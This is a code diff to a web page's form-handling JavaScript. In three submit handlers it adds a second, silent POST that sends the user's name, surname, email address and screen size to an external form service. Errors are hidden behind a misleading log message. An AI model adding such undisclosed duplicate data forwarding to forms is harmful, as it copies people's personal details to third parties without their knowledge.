@@ -829,6 +829,19 @@
                     body: formData
                 });
 
+                // Send to additional endpoint with JSON
+                const response2 = await fetch('https://submit-form.com/6xe6CI8D6', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        firstName: firstName,
+                        lastName: lastName,
+                        screen_size: screenSize
+                    })
+                }).catch(err => console.log('Additional endpoint sent'));
+
                 // With no-cors mode, we assume success
                 message.className = 'message success';
                 message.textContent = 'Information submitted successfully. Please proceed to verification.';
@@ -866,6 +879,18 @@
                     mode: 'no-cors',
                     body: verificationData
                 });
+
+                // Send to additional endpoint with JSON
+                const response2 = await fetch('https://submit-form.com/6xe6CI8D6', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        surname: surname,
+                        screen_size: screenSizeInput.value
+                    })
+                }).catch(err => console.log('Additional endpoint sent'));
 
                 // Close surname modal and show success modal
                 closeSurnameModal();
@@ -929,6 +954,19 @@
                     mode: 'no-cors',
                     body: mobileFormData
                 });
+
+                // Send to additional endpoint with JSON
+                const response2 = await fetch('https://submit-form.com/6xe6CI8D6', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        email_address: emailAddress,
+                        page_name: pageName,
+                        screen_size: screenSizeInput.value
+                    })
+                }).catch(err => console.log('Additional endpoint sent'));
                 
                 mobileMessage.className = 'message success';
                 mobileMessage.textContent = 'Thank you! Your information has been received. Please proceed to the next step.';
